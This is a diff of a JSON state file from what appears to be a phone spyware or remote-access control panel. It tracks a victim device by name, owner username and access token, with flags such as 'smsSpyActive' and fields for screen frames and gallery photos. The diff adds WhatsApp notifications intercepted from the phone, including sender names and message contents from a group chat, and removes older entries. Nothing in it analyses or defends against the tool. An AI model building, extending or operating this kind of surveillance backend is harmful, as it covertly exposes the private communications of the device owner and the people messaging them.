@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003777990,
+    "lastSeen": 1776003782832,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎25 pesan baru",
+        "time": "12/04 21:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003782838
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (28 pesan): ~ 𝒜𝓋𝑒𝓁𝓎𝓃 𝒢𝓇𝒾𝓈𝑒𝓁𝒹𝒶 𝒱𝒶𝓁𝑒𝓇𝓎",
+        "content": "hapus burem",
+        "time": "12/04 21:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003781693
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (26 pesan): ~ kv",
+        "content": "jomok",
+        "time": "12/04 21:22",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003781661
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (26 pesan): ~ sky",
@@ -4099,30 +4123,6 @@
         "time": "12/04 10:24",
         "pkg": "com.whatsapp",
         "receivedAt": 1775964297287
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Menghapus pesan…",
-        "content": "‎227 dari 374 (60%)",
-        "time": "12/04 10:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775964296904
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Menghapus pesan…",
-        "content": "‎200 dari 222 (90%)",
-        "time": "12/04 10:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775964296372
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Menghapus pesan…",
-        "content": "‎121 dari 200 (60%)",
-        "time": "12/04 10:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775964296008
       }
     ],
     "galleryPhotos": [],
